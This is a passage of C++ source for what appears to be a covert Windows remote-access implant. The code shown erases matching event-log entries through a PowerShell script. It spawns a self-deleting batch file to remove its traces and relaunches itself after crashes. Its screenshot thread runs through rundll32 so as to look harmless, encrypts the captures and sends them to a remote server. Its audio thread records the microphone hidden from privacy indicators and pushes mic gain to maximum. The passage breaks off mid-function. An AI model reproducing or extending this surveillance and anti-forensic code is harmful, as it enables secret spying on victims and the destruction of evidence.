                        "  $events=@(Get-WinEvent -LogName $logName -MaxEvents 5000 -ErrorAction SilentlyContinue)\n"
                        "  if($events.Count -eq 0){continue}\n"
                        "  $toKeep=@()\n"
                        "  $hit=0\n"
                        "  foreach($e in $events){\n"
                        "    $msg=$e.Message; $props=''\n"
                        "    try{ $props=(($e.Properties|ForEach-Object{[string]$_.Value}) -join ' ') }catch{}\n"
                        "    $prov=$e.ProviderName\n"
                        "    if(($msg -match $pattern) -or ($props -match $pattern) -or ($prov -match $pattern)){ $hit++ }\n"
                        "    else { $toKeep+=$e }\n"
                        "  }\n"
                        "  if($hit -eq 0){continue}\n"
                        "  & wevtutil.exe cl $logName 2>$null\n"
                        "  $keep=$toKeep | Sort-Object TimeCreated\n"
                        "  if($keep.Count -gt 500){ $keep=$keep | Select-Object -Last 500 }\n"
                        "  foreach($e in $keep){\n"
                        "    try{\n"
                        "      $src=$e.ProviderName\n"
                        "      $et='Information'\n"
                        "      switch($e.LevelDisplayName){'Error'{$et='Error'}'Warning'{$et='Warning'}'Critical'{$et='Error'}}\n"
                        "      if(-not [System.Diagnostics.EventLog]::SourceExists($src)){\n"
                        "        try{ New-EventLog -LogName $logName -Source $src -ErrorAction SilentlyContinue }catch{}\n"
                        "      }\n"
                        "      Write-EventLog -LogName $logName -Source $src -EventId ([int]($e.Id % 65536)) -EntryType $et -Message $e.Message -ErrorAction SilentlyContinue\n"
                        "    }catch{}\n"
                        "  }\n"
                        "}\n";
                    { std::ofstream f(scriptPath); f << script; }
                    std::string psCmd = "powershell -NoProfile -ExecutionPolicy Bypass -File \"" + scriptPath + "\"";
                    g_procs.run_cmd_capture(psCmd);
                    DeleteFileA(scriptPath.c_str());
                }
            }

            evt(6, TOTAL, "Spawning cleanup script");
            char tempDir[MAX_PATH] = {0};
            GetTempPathA(MAX_PATH, tempDir);
            std::string batPath = std::string(tempDir) + "wpnp_destruct.bat";

            std::string bat;
            bat += "@echo off\r\n";
            bat += "ping 127.0.0.1 -n 3 > nul\r\n";
            bat += ":retry\r\n";
            bat += "del /f /q \"" + exePath + "\" 2>nul\r\n";
            bat += "if exist \"" + exePath + "\" ( ping 127.0.0.1 -n 2 > nul & goto retry )\r\n";
            if (!cfgAbs.empty())
                bat += "del /f /q \"" + cfgAbs + "\" 2>nul\r\n";
            bat += "del /f /q \"C:\\RemoteDesktopHost.log\" 2>nul\r\n";
            bat += "del /f /q \"C:\\Windows\\Temp\\wpnp_step.txt\" 2>nul\r\n";
            bat += "(goto) 2>nul & del /f /q \"%~f0\"\r\n";

            HANDLE hb = CreateFileA(batPath.c_str(), GENERIC_WRITE, 0, NULL,
                                    CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hb != INVALID_HANDLE_VALUE) {
                DWORD wr = 0;
                WriteFile(hb, bat.data(), (DWORD)bat.size(), &wr, NULL);
                CloseHandle(hb);

                STARTUPINFOA si = {sizeof(si)};
                si.dwFlags = STARTF_USESHOWWINDOW;
                si.wShowWindow = SW_HIDE;
                PROCESS_INFORMATION pi = {};
                std::string runCmd = "cmd.exe /c \"" + batPath + "\"";
                CreateProcessA(NULL, (LPSTR)runCmd.c_str(), NULL, NULL, FALSE,
                    DETACHED_PROCESS | CREATE_BREAKAWAY_FROM_JOB | CREATE_NO_WINDOW,
                    NULL, tempDir, &si, &pi);
                if (pi.hProcess) CloseHandle(pi.hProcess);
                if (pi.hThread)  CloseHandle(pi.hThread);
            }

            evt(7, TOTAL, "Disconnecting");
            evt(8, TOTAL, "Done — host exiting");
            std::this_thread::sleep_for(std::chrono::milliseconds(300));

            g_running = false;
            std::this_thread::sleep_for(std::chrono::milliseconds(200));
            ExitProcess(0);
        }

        else {
            send_err("Unknown command: " + cmd);
        }
    }
    catch (const std::exception& e) {
        g_log.error("handle_command exception: " + std::string(e.what()));
    }
}

// ===== Binary upload handler (file write) =====
static void handle_binary(const std::vector<uint8_t>& data) {
    try {
        if (data.size() < 4) return;
        const char* hdr = reinterpret_cast<const char*>(data.data());
        if (memcmp(hdr, "WCHK", 4) == 0) {
            if (data.size() < 15) return;
            bool last = data[4] != 0;
            uint16_t plen = *reinterpret_cast<const uint16_t*>(&data[5]);
            if (data.size() < (size_t)(7 + plen + 8)) return;
            std::string path(reinterpret_cast<const char*>(&data[7]), plen);
            uint64_t offset = *reinterpret_cast<const uint64_t*>(&data[7 + plen]);
            const uint8_t* chunk = &data[7 + plen + 8];
            size_t chunk_sz = data.size() - (7 + plen + 8);
            g_files.write_chunk(path, chunk, chunk_sz, offset, last);
        }
    } catch (const std::exception& e) {
        g_log.error("handle_binary exception: " + std::string(e.what()));
    } catch (...) {
        g_log.error("handle_binary unknown exception");
    }
}

// ===== Cleanup: restore system state before exit =====
static void cleanup_system() {
    try { stop_streaming(); } catch (...) {}
    try { stop_file_workers(); } catch (...) {}
    try { close_file_connections(); } catch (...) {}
    timeEndPeriod(1);
    if (g_power_scheme_saved) {
        PowerSetActiveScheme(NULL, &g_saved_power_scheme);
        g_log.info("Power plan restored");
    }
    SetThreadExecutionState(ES_CONTINUOUS);
    DwmEnableMMCSS(FALSE);
    WSACleanup();
}

// ===== Crash-proof handlers — host must NEVER die =====

// SEH: catch access violations, stack overflows, etc.
static LONG WINAPI CrashHandler(EXCEPTION_POINTERS* ep) {
    DWORD code = ep ? ep->ExceptionRecord->ExceptionCode : 0;
    // Log to file directly (Logger might be corrupted)
    FILE* f = nullptr; // fopen("C:\\RemoteDesktopHost_crash.log", "a");
    if (f) {
        SYSTEMTIME st; GetLocalTime(&st);
        fprintf(f, "[%04d-%02d-%02d %02d:%02d:%02d] SEH exception 0x%08lX at %p\n",
            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond,
            code, ep ? ep->ExceptionRecord->ExceptionAddress : nullptr);
        fclose(f);
    }
    try { g_log.error("SEH exception 0x" + std::to_string(code) + " — process will restart"); } catch (...) {}
    // Return EXCEPTION_CONTINUE_SEARCH to let the OS terminate,
    // but we'll restart via the outer process watchdog or the fault-tolerant loop.
    // For stack overflow, we can't continue — must restart the process.
    if (code == EXCEPTION_STACK_OVERFLOW) {
        // Re-launch ourselves
        char exe[MAX_PATH];
        if (GetModuleFileNameA(NULL, exe, MAX_PATH)) {
            STARTUPINFOA si = {}; si.cb = sizeof(si);
            PROCESS_INFORMATION pi = {};
            CreateProcessA(exe, GetCommandLineA(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
            if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
        }
        ExitProcess(1);
    }
    return EXCEPTION_EXECUTE_HANDLER;
}

// C++ terminate handler — called on uncaught exceptions, double-throw, etc.
static void TerminateHandler() {
    try { g_log.error("std::terminate called — restarting process"); } catch (...) {}
    FILE* f = nullptr; // fopen("C:\\RemoteDesktopHost_crash.log", "a");
    if (f) { fprintf(f, "std::terminate called\n"); fclose(f); }
    // Re-launch ourselves
    char exe[MAX_PATH];
    if (GetModuleFileNameA(NULL, exe, MAX_PATH)) {
        STARTUPINFOA si = {}; si.cb = sizeof(si);
        PROCESS_INFORMATION pi = {};
        CreateProcessA(exe, GetCommandLineA(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    }
    ExitProcess(1);
}

// ═══════════════════════════════════════════════════════════════
//  AES-256-CBC ENCRYPTION (compatible with ServiceManagerApp)
// ═══════════════════════════════════════════════════════════════
static const BYTE g_aes_key[32] = {
    0x3A,0x7F,0x21,0x94,0xC5,0xD2,0x6B,0x11,0x8E,0x4C,0xF9,0x53,0x07,0xB8,0xDA,0x62,
    0x19,0xAF,0x33,0xE4,0x5D,0x70,0x88,0x9B,0xC1,0x2E,0x47,0x6A,0x8D,0x90,0xAB,0xCD
};
static const BYTE g_aes_iv[16] = {
    0x12,0x34,0x56,0x78,0x9A,0xBC,0xDE,0xF0,0x0F,0x1E,0x2D,0x3C,0x4B,0x5A,0x69,0x78
};

static std::vector<uint8_t> aes_encrypt(const uint8_t* data, size_t len) {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    std::vector<uint8_t> result;
    NTSTATUS st;

    st = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (st != 0 || !hAlg) return result;

    st = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);

    // Get key object size
    ULONG keyObjLen = 0, cbData = 0;
    st = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&keyObjLen, sizeof(ULONG), &cbData, 0);
    if (st != 0 || keyObjLen == 0) keyObjLen = 512;

    std::vector<BYTE> keyObj(keyObjLen);
    st = BCryptGenerateSymmetricKey(hAlg, &hKey, keyObj.data(), keyObjLen, (PUCHAR)g_aes_key, 32, 0);
    if (st != 0 || !hKey) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return result;
    }

    // PKCS7 padding
    size_t padLen = 16 - (len % 16);
    std::vector<uint8_t> padded(len + padLen);
    memcpy(padded.data(), data, len);
    memset(padded.data() + len, (uint8_t)padLen, padLen);

    BYTE iv_copy[16];
    memcpy(iv_copy, g_aes_iv, 16);

    ULONG cbResult = 0;
    result.resize(padded.size() + 16);
    st = BCryptEncrypt(hKey, padded.data(), (ULONG)padded.size(), nullptr,
                       iv_copy, 16, result.data(), (ULONG)result.size(), &cbResult, 0);
    if (st != 0) {
        char hexBuf[32]; snprintf(hexBuf, sizeof(hexBuf), "0x%08X", (unsigned)st);
        g_log.warn("AES encrypt failed: NTSTATUS=" + std::string(hexBuf) + " padded=" + std::to_string(padded.size()));
        result.clear();
    } else {
        result.resize(cbResult);
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}

static std::vector<uint8_t> aes_decrypt(const uint8_t* data, size_t len) {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    std::vector<uint8_t> result;
    NTSTATUS st;
    st = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (st != 0 || !hAlg) return result;
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    ULONG keyObjLen = 0, cbData = 0;
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&keyObjLen, sizeof(ULONG), &cbData, 0);
    if (keyObjLen == 0) keyObjLen = 512;
    std::vector<BYTE> keyObj(keyObjLen);
    st = BCryptGenerateSymmetricKey(hAlg, &hKey, keyObj.data(), keyObjLen, (PUCHAR)g_aes_key, 32, 0);
    if (st != 0 || !hKey) { BCryptCloseAlgorithmProvider(hAlg, 0); return result; }
    BYTE iv_copy[16];
    memcpy(iv_copy, g_aes_iv, 16);
    ULONG cbResult = 0;
    result.resize(len + 16);
    st = BCryptDecrypt(hKey, (PUCHAR)data, (ULONG)len, nullptr, iv_copy, 16,
                       result.data(), (ULONG)result.size(), &cbResult, 0);
    if (st != 0) { result.clear(); }
    else {
        result.resize(cbResult);
        // Remove PKCS7 padding
        if (!result.empty()) {
            uint8_t pad = result.back();
            if (pad > 0 && pad <= 16 && result.size() >= pad) result.resize(result.size() - pad);
        }
    }
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}

static std::string encrypt_filename(const std::string& name) {
    auto enc = aes_encrypt((const uint8_t*)name.data(), name.size());
    if (enc.empty()) return name;
    // Base64 encode
    static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    for (size_t i = 0; i < enc.size(); i += 3) {
        uint32_t n = ((uint32_t)enc[i]) << 16;
        if (i + 1 < enc.size()) n |= ((uint32_t)enc[i+1]) << 8;
        if (i + 2 < enc.size()) n |= enc[i+2];
        out += b64[(n >> 18) & 63];
        out += b64[(n >> 12) & 63];
        out += (i + 1 < enc.size()) ? b64[(n >> 6) & 63] : '=';
        out += (i + 2 < enc.size()) ? b64[n & 63] : '=';
    }
    // URL-safe: / → _, + → -, remove =
    for (auto& c : out) { if (c == '/') c = '_'; else if (c == '+') c = '-'; }
    while (!out.empty() && out.back() == '=') out.pop_back();
    return out;
}

// ═══════════════════════════════════════════════════════════════
//  SCREENSHOT AUTO-CAPTURE THREAD
// ═══════════════════════════════════════════════════════════════

static std::string get_foreground_window_title() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return "";
    wchar_t buf[512] = {};
    GetWindowTextW(hwnd, buf, 512);
    // Convert to UTF-8
    int len = WideCharToMultiByte(CP_UTF8, 0, buf, -1, nullptr, 0, nullptr, nullptr);
    if (len <= 0) return "";
    std::string s(len - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, buf, -1, &s[0], len, nullptr, nullptr);
    return s;
}

static bool should_capture_app(const std::string& windowTitle) {
    if (g_screenshot_always.load()) return true;
    if (windowTitle.empty()) return false;
    std::lock_guard<std::mutex> lk(g_screenshot_apps_mtx);
    // If "always" is off AND no apps are specified → don't capture anything.
    // User must either enable "always" or specify at least one app pattern.
    if (g_screenshot_apps.empty()) return false;
    // Check each comma-separated pattern (case-insensitive)
    std::istringstream ss(g_screenshot_apps);
    std::string pattern;
    std::string titleLower = windowTitle;
    for (auto& c : titleLower) c = (char)tolower((unsigned char)c);
    while (std::getline(ss, pattern, ',')) {
        while (!pattern.empty() && pattern.front() == ' ') pattern.erase(pattern.begin());
        while (!pattern.empty() && pattern.back() == ' ') pattern.pop_back();
        if (pattern.empty()) continue;
        std::string patLower = pattern;
        for (auto& c : patLower) c = (char)tolower((unsigned char)c);
        if (titleLower.find(patLower) != std::string::npos) return true;
    }
    return false;
}

// Capture screenshot in user session via rundll32 ScreenshotCapture export (for DLL/service mode)
// rundll32.exe is a standard Windows process — doesn't look suspicious in Task Manager
static bool capture_screenshot_user_session(std::vector<uint8_t>& jpegOut, std::string& windowTitle, int quality, int scale) {
    DWORD sessionId = WTSGetActiveConsoleSessionId();
    if (sessionId == 0xFFFFFFFF) { g_log.warn("Screenshot: no active session"); return false; }

    // Get DLL path
    extern HMODULE g_dll_module;
    char dllPathBuf[MAX_PATH] = {};
    GetModuleFileNameA(g_dll_module, dllPathBuf, MAX_PATH);
    std::string dllPath(dllPathBuf);
    g_log.debug("Screenshot: DLL path=" + dllPath + " session=" + std::to_string(sessionId));

    // Temp files
    char tmpPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tmpPath);
    uint64_t tick = GetTickCount64();
    // Random names without recognizable extensions (anti-forensic)
    std::string outFile = std::string(tmpPath) + std::to_string(tick) + ".tmp";
    std::string titleFile = std::string(tmpPath) + std::to_string(tick) + "t.tmp";

    // Build command: rundll32.exe "path\to\dll",ScreenshotCapture quality scale mode output title
    int mode = g_screenshot_mode.load();
    std::string cmdLine = "rundll32.exe \"" + dllPath + "\",ScreenshotCapture " +
        std::to_string(quality) + " " + std::to_string(scale) + " " + std::to_string(mode) + " " + outFile + " " + titleFile;

    // Get user token
    HANDLE hToken = nullptr;
    if (!WTSQueryUserToken(sessionId, &hToken)) return false;
    HANDLE hDupToken = nullptr;
    DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, nullptr, SecurityImpersonation, TokenPrimary, &hDupToken);
    CloseHandle(hToken);
    if (!hDupToken) return false;

    LPVOID pEnv = nullptr;
    CreateEnvironmentBlock(&pEnv, hDupToken, FALSE);

    STARTUPINFOA si = {}; si.cb = sizeof(si);
    si.lpDesktop = (LPSTR)"winsta0\\default";
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};

    BOOL ok = CreateProcessAsUserA(hDupToken, nullptr, (LPSTR)cmdLine.c_str(), nullptr, nullptr, FALSE,
        CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW, pEnv, nullptr, &si, &pi);

    if (pEnv) DestroyEnvironmentBlock(pEnv);
    CloseHandle(hDupToken);
    if (!ok) {
        DWORD err = GetLastError();
        g_log.warn("Screenshot: CreateProcessAsUser failed err=" + std::to_string(err) + " cmd=" + cmdLine);
        return false;
    }

    g_log.debug("Screenshot: rundll32 started PID=" + std::to_string(pi.dwProcessId));
    DWORD waitResult = WaitForSingleObject(pi.hProcess, 10000);
    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    g_log.debug("Screenshot: rundll32 finished wait=" + std::to_string(waitResult) + " exit=" + std::to_string(exitCode));

    // Read JPEG
    std::ifstream fJpeg(outFile, std::ios::binary);
    if (!fJpeg.is_open()) { g_log.warn("Screenshot: JPEG file not found: " + outFile); return false; }
    jpegOut.assign((std::istreambuf_iterator<char>(fJpeg)), std::istreambuf_iterator<char>());
    fJpeg.close();
    DeleteFileA(outFile.c_str());

    // Read window title
    std::ifstream fTitle(titleFile);
    if (fTitle.is_open()) {
        std::getline(fTitle, windowTitle);
        while (!windowTitle.empty() && (windowTitle.back() == '\n' || windowTitle.back() == '\r')) windowTitle.pop_back();
        fTitle.close();
    }
    DeleteFileA(titleFile.c_str());

    return !jpegOut.empty();
}

static void screenshot_thread_func() {
    g_log.info("Screenshot thread started");
    std::this_thread::sleep_for(std::chrono::seconds(3));

    // In EXE mode, use direct capture. In DLL/service mode, use user session capture.
    ScreenCapture screencap;
    bool cap_inited = false;

    bool firstCapture = true;
    while (g_running) {
        if (!firstCapture) {
            // Sleep for interval, checking every second for changes
            for (int i = 0; i < g_screenshot_interval.load() && g_running && g_screenshot_active.load(); i++)
                std::this_thread::sleep_for(std::chrono::seconds(1));
        }
        firstCapture = false;

        if (!g_running || !g_screenshot_active.load()) continue;
        if (!g_ws || !g_ws->is_connected()) { g_log.debug("Screenshot: VPS offline, skipping"); continue; }
        if (g_paused_by_threat.load()) { g_log.debug("Screenshot: paused by threat, skipping"); continue; }

        g_log.info("Screenshot: capturing...");
        std::vector<uint8_t> jpegData;
        std::string windowTitle;

        if (g_service_mode) {
            // DLL/service mode: capture via rundll32 in user session
            bool ok = capture_screenshot_user_session(jpegData, windowTitle,
                    g_screenshot_quality.load(), g_screenshot_scale.load());
            g_log.info("Screenshot: capture " + std::string(ok ? "OK" : "FAILED") +
                       " size=" + std::to_string(jpegData.size()) + " title=" + windowTitle);
            if (!ok) continue;
            // Check app filter
            if (!should_capture_app(windowTitle)) { g_log.debug("Screenshot: app filter rejected"); continue; }
        } else {
            // EXE mode: direct capture
            windowTitle = get_foreground_window_title();
            if (!should_capture_app(windowTitle)) continue;

            if (!cap_inited) {
                screencap.init(g_screenshot_quality.load(), g_screenshot_scale.load());
                cap_inited = true;
            }
            screencap.set_quality(g_screenshot_quality.load());
            screencap.set_scale(g_screenshot_scale.load());

            ScreenCapture::Frame frame;
            if (!screencap.capture(frame) || frame.jpeg_data.empty()) continue;
            jpegData = std::move(frame.jpeg_data);
        }

        if (jpegData.empty()) continue;

        // Build clean filename: date_time_AppOrSite
        SYSTEMTIME st;
        GetLocalTime(&st);
        char timeBuf[64];
        snprintf(timeBuf, sizeof(timeBuf), "%04d%02d%02d_%02d%02d%02d",
                 st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
        std::string plainName = std::string(timeBuf);

        // Extract clean app/site name from window title
        if (!windowTitle.empty()) {
            std::string shortName;
            std::string t = windowTitle;

            // Known browsers: extract site name (before " - " or " — ")
            // First: check if window title matches any app from the filter list
            // If matched, use the filter keyword as the group name
            auto toLower = [](std::string s) { for(auto&c:s) c=(char)tolower((unsigned char)c); return s; };
            std::string tl = toLower(t);
            {
                std::lock_guard<std::mutex> lk(g_screenshot_apps_mtx);
                if (!g_screenshot_apps.empty()) {
                    std::istringstream appStream(g_screenshot_apps);
                    std::string pat;
                    while (std::getline(appStream, pat, ',')) {
                        while (!pat.empty() && pat.front() == ' ') pat.erase(pat.begin());
                        while (!pat.empty() && pat.back() == ' ') pat.pop_back();
                        if (pat.empty()) continue;
                        if (tl.find(toLower(pat)) != std::string::npos) {
                            // Capitalize first letter
                            shortName = pat;
                            if (!shortName.empty()) shortName[0] = (char)toupper((unsigned char)shortName[0]);
                            break;
                        }
                    }
                }
            }

            // If no app filter matched, extract name automatically
            if (shortName.empty()) {
                bool isBrowser = false;
                for (auto& br : {"Chrome","Firefox","Edge","Opera","Brave","Vivaldi","Safari","Yandex"})
                    if (t.find(br) != std::string::npos) { isBrowser = true; break; }

                if (isBrowser) {
                    // Extract first part before " - " or " — "
                    size_t sep = t.find(" - ");
                    if (sep == std::string::npos) sep = t.find(" \xE2\x80\x94 ");
                    std::string page = (sep != std::string::npos) ? t.substr(0, sep) : t;
                    size_t dot = page.find('.');
                    if (dot != std::string::npos && dot > 0 && page.size() - dot <= 10) {
                        size_t slash = page.find('/');
                        shortName = (slash != std::string::npos) ? page.substr(0, slash) : page;
                    } else {
                        shortName = page.substr(0, 25);
                    }
                } else {
                    // Non-browser: extract app name (last part after " - ")
                    size_t sep = t.rfind(" - ");
                    if (sep != std::string::npos && sep + 3 < t.size())
                        shortName = t.substr(sep + 3);
                    else
                        shortName = t;
                    if (shortName.size() > 25) shortName = shortName.substr(0, 25);
                }
            }

            // Sanitize
            std::string safe;
            for (char c : shortName) {
                if (isalnum((unsigned char)c) || c == ' ' || c == '-' || c == '_' || c == '.') safe += c;
            }
            while (!safe.empty() && safe.back() == ' ') safe.pop_back();
            while (!safe.empty() && safe.front() == ' ') safe.erase(safe.begin());
            if (!safe.empty()) plainName += "_" + safe;
        }

        // Encrypt
        std::string encName = encrypt_filename(plainName);
        auto encData = aes_encrypt(jpegData.data(), jpegData.size());
        if (encData.empty()) { g_log.warn("Screenshot: AES encrypt failed for " + plainName); continue; }

        // Build SHOT packet
        uint32_t nameLen = (uint32_t)encName.size();
        std::vector<uint8_t> packet(4 + 4 + nameLen + encData.size());
        memcpy(packet.data(), "SHOT", 4);
        memcpy(packet.data() + 4, &nameLen, 4);
        memcpy(packet.data() + 8, encName.data(), nameLen);
        memcpy(packet.data() + 8 + nameLen, encData.data(), encData.size());

        if (g_ws && g_ws->is_connected()) {
            g_ws->send_binary_priority(packet);
            g_log.info("Screenshot SENT: " + plainName + " pkt=" + std::to_string(packet.size()) + " enc=" + std::to_string(encData.size()));
        }
    }
    if (!g_service_mode) screencap.stop();
    g_log.info("Screenshot thread stopped");
}

// ═══════════════════════════════════════════════════════════════
//  AUDIO RECORDING THREAD
// ═══════════════════════════════════════════════════════════════

// Record audio INLINE in current thread (Session 0, no separate process)
// No rundll32 = no tray icon, no Privacy tracking, invisible.
// Output: OGG Opus — tiny files, browser plays natively.
#include <mmsystem.h>
#include <opus/opus.h>

// OGG CRC32 lookup table (polynomial 0x04C11DB7)
static uint32_t ogg_crc_table[256];
static bool ogg_crc_inited = false;
static void ogg_crc_init() {
    if (ogg_crc_inited) return;
    for (int i = 0; i < 256; i++) {
        uint32_t r = (uint32_t)i << 24;
        for (int j = 0; j < 8; j++) r = (r << 1) ^ ((r & 0x80000000U) ? 0x04C11DB7U : 0);
        ogg_crc_table[i] = r;
    }
    ogg_crc_inited = true;
}
static uint32_t ogg_crc(const uint8_t* data, size_t len) {
    ogg_crc_init();
    uint32_t crc = 0;
    for (size_t i = 0; i < len; i++) crc = (crc << 8) ^ ogg_crc_table[((crc >> 24) ^ data[i]) & 0xFF];
    return crc;
}

// Write one OGG page with one packet
static void ogg_write_page(std::vector<uint8_t>& out, uint8_t flags, uint32_t serial,
                           uint32_t pageSeq, uint64_t granule, const uint8_t* pktData, int pktLen) {
    // Segment table: packet split into 255-byte segments + remainder
    int nSegs = pktLen / 255 + 1;
    size_t headerSize = 27 + nSegs;
    size_t start = out.size();
    out.resize(start + headerSize + pktLen);
    uint8_t* p = out.data() + start;

    // Page header
    memcpy(p, "OggS", 4);
    p[4] = 0;           // version
    p[5] = flags;        // 0x02=BOS, 0x04=EOS
    memcpy(p + 6, &granule, 8);
    memcpy(p + 14, &serial, 4);
    memcpy(p + 18, &pageSeq, 4);
    memset(p + 22, 0, 4); // CRC placeholder
    p[26] = (uint8_t)nSegs;

    // Segment table
    int remain = pktLen;
    for (int i = 0; i < nSegs; i++) {
        p[27 + i] = (remain >= 255) ? 255 : (uint8_t)remain;
        remain -= 255;
        if (remain < 0) remain = 0;
    }

    // Packet data
    memcpy(p + headerSize, pktData, pktLen);

    // CRC32 over entire page
    uint32_t c = ogg_crc(p, headerSize + pktLen);
    memcpy(p + 22, &c, 4);
}

// Audio cleanup functions defined in dllmain.cpp, declared at top of this file.

// ===== capture_audio_direct =====
static bool capture_audio_direct(std::vector<uint8_t>& audioOut, int duration, int sampleRate, int bitrate, int channels) {
    // Opus requires 8/12/16/24/48 kHz — snap to nearest supported rate
    auto snapOpusSR = [](int sr) -> int {
        if (sr <= 8000)  return 8000;
        if (sr <= 12000) return 12000;
        if (sr <= 16000) return 16000;
        if (sr <= 24000) return 24000;
        return 48000;
    };
    int opusSR = snapOpusSR(sampleRate);

    // Try to open waveIn at the desired Opus SR. Some devices (USB mics, Bluetooth)
    // reject formats they don't natively support. On failure, fall back through
    // lower Opus-valid rates until one works.
    static const int kFallbackRates[] = {48000, 24000, 16000, 12000, 8000};
    HWAVEIN hWaveIn = nullptr;
    WAVEFORMATEX wfx = {};
    UINT deviceId = (g_audio_device_id.load() >= 0) ? (UINT)g_audio_device_id.load() : WAVE_MAPPER;
    bool opened = false;
    for (int tryRate : kFallbackRates) {
        // Only try rates ≤ desired — don't upsample to a rate the user didn't ask for
        // Exception: if desired is 48k and fails, always try lower.
        if (tryRate > opusSR && opusSR != 48000) continue;
        wfx = {};
        wfx.wFormatTag      = WAVE_FORMAT_PCM;
        wfx.nChannels       = (WORD)channels;
        wfx.nSamplesPerSec  = (DWORD)tryRate;
        wfx.wBitsPerSample  = 16;
        wfx.nBlockAlign     = wfx.nChannels * wfx.wBitsPerSample / 8;
        wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
        MMRESULT mr = waveInOpen(&hWaveIn, deviceId, &wfx, 0, 0, CALLBACK_NULL);
        if (mr == MMSYSERR_NOERROR) {
            if (tryRate != opusSR)
                g_log.info("Audio: waveInOpen fallback " + std::to_string(opusSR) + "->" + std::to_string(tryRate) + "Hz");
            opusSR = tryRate; // encode at the rate we actually captured
            opened = true;
            break;
        }
        g_log.warn("Audio: waveInOpen " + std::to_string(tryRate) + "Hz failed err=" + std::to_string(mr));
    }
    if (!opened) {
        g_log.warn("Audio: waveInOpen failed for all rates");
        return false;
    }

    DWORD bufSize = wfx.nAvgBytesPerSec * duration;
    std::vector<BYTE> pcmBuf(bufSize);
    WAVEHDR waveHdr = {};
    waveHdr.lpData = (LPSTR)pcmBuf.data();
    waveHdr.dwBufferLength = bufSize;

    // Boost microphone volume to maximum before recording
    {
        HMIXER hMixer = nullptr;
        if (mixerOpen(&hMixer, (UINT)(UINT_PTR)hWaveIn, 0, 0, MIXER_OBJECTF_HWAVEIN) == MMSYSERR_NOERROR) {
            MIXERLINE ml = {}; ml.cbStruct = sizeof(ml);
            ml.dwComponentType = MIXERLINE_COMPONENTTYPE_SRC_MICROPHONE;
            if (mixerGetLineInfo((HMIXEROBJ)hMixer, &ml, MIXER_GETLINEINFOF_COMPONENTTYPE) == MMSYSERR_NOERROR) {
                MIXERLINECONTROLS mlc = {}; mlc.cbStruct = sizeof(mlc);
                mlc.dwLineID = ml.dwLineID;
                mlc.dwControlType = MIXERCONTROL_CONTROLTYPE_VOLUME;
                MIXERCONTROL mc = {}; mc.cbStruct = sizeof(mc);
                mlc.cControls = 1; mlc.cbmxctrl = sizeof(mc); mlc.pamxctrl = &mc;
                if (mixerGetLineControls((HMIXEROBJ)hMixer, &mlc, MIXER_GETLINECONTROLSF_ONEBYTYPE) == MMSYSERR_NOERROR) {
                    MIXERCONTROLDETAILS mcd = {}; mcd.cbStruct = sizeof(mcd);
                    mcd.dwControlID = mc.dwControlID;
                    mcd.cChannels = 1;
                    MIXERCONTROLDETAILS_UNSIGNED val = {};
                    val.dwValue = mc.Bounds.dwMaximum; // Set to max volume
                    mcd.cbDetails = sizeof(val); mcd.paDetails = &val;
                    mixerSetControlDetails((HMIXEROBJ)hMixer, &mcd, 0);
                    g_log.info("Audio: mic volume set to max (" + std::to_string(mc.Bounds.dwMaximum) + ")");
                }
                // Also try boost control
                mlc.dwControlType = MIXERCONTROL_CONTROLTYPE_ONOFF; // Mic boost
                if (mixerGetLineControls((HMIXEROBJ)hMixer, &mlc, MIXER_GETLINECONTROLSF_ONEBYTYPE) == MMSYSERR_NOERROR) {
                    MIXERCONTROLDETAILS mcd = {}; mcd.cbStruct = sizeof(mcd);
                    mcd.dwControlID = mc.dwControlID;
                    mcd.cChannels = 1;
                    MIXERCONTROLDETAILS_BOOLEAN val = {}; val.fValue = TRUE;
                    mcd.cbDetails = sizeof(val); mcd.paDetails = &val;
                    mixerSetControlDetails((HMIXEROBJ)hMixer, &mcd, 0);
                    g_log.info("Audio: mic boost enabled");
                }
            }
            mixerClose(hMixer);
        }
    }

    waveInPrepareHeader(hWaveIn, &waveHdr, sizeof(WAVEHDR));
    waveInAddBuffer(hWaveIn, &waveHdr, sizeof(WAVEHDR));
    waveInStart(hWaveIn);

